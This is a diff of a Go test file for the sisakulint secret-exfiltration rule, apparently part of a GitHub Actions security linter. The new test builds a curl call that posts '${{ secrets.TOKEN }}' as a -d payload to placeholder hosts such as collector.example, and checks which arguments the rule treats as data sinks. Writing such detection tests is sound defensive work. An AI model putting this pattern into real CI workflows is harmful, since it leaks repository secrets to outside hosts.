@@ -5,6 +5,7 @@ import (
 	"testing"
 
 	"github.com/sisaku-security/sisakulint/pkg/ast"
+	"github.com/sisaku-security/sisakulint/pkg/shell"
 )
 
 func TestNewSecretExfiltrationRule(t *testing.T) {
@@ -1096,30 +1097,33 @@ func TestSecretExfiltration_ExtractSecretRef(t *testing.T) {
 	}
 }
 
-func TestSecretExfiltration_LineContainsCommand(t *testing.T) {
+func TestSecretExfiltration_ASTArgSinkClassification(t *testing.T) {
 	rule := NewSecretExfiltrationRule()
-
-	tests := []struct {
-		line     string
-		cmd      string
-		expected bool
-	}{
-		{"curl https://example.com", "curl", true},
-		{"  curl https://example.com", "curl", true},
-		{"$(curl https://example.com)", "curl", true},
-		{"`curl https://example.com`", "curl", true},
-		{"echo test && curl https://example.com", "curl", true},
-		{"echo test; curl https://example.com", "curl", true},
-		{"CURL=value", "curl", false},
-		{"mycurl https://example.com", "curl", false},
-		{"echo curl", "curl", true}, // This is a false positive but acceptable
+	curl, ok := networkCommandByName("curl")
+	if !ok {
+		t.Fatalf("curl command config not found")
 	}
 
-	for _, tt := range tests {
-		got := rule.lineContainsCommand(tt.line, tt.cmd)
-		if got != tt.expected {
-			t.Errorf("lineContainsCommand(%q, %q) = %v, want %v", tt.line, tt.cmd, got, tt.expected)
-		}
+	call := shell.NetworkCommandCall{
+		CommandName: "curl",
+		Args: []shell.CommandArg{
+			{Value: "-H", LiteralValue: "-H", IsFlag: true},
+			{Value: "Content-Type: application/json", LiteralValue: "Content-Type: application/json"},
+			{Value: "https://example.com/webhook", LiteralValue: "https://example.com/webhook"},
+			{Value: "-d", LiteralValue: "-d", IsFlag: true},
+			{Value: `{"token":"${{ secrets.TOKEN }}"}`, LiteralValue: `{"token":"${{ secrets.TOKEN }}"}`},
+			{Value: "https://collector.example/upload", LiteralValue: "https://collector.example/upload"},
+		},
+	}
+
+	if rule.isDataSinkArg(call, 2, curl) {
+		t.Errorf("metadata header value should not make following URL positional arg a data sink")
+	}
+	if !rule.isDataSinkArg(call, 4, curl) {
+		t.Errorf("-d payload value should be a data sink")
+	}
+	if rule.isDataSinkArg(call, 5, curl) {
+		t.Errorf("URL positional arg should not be a data sink")
 	}
 }
 
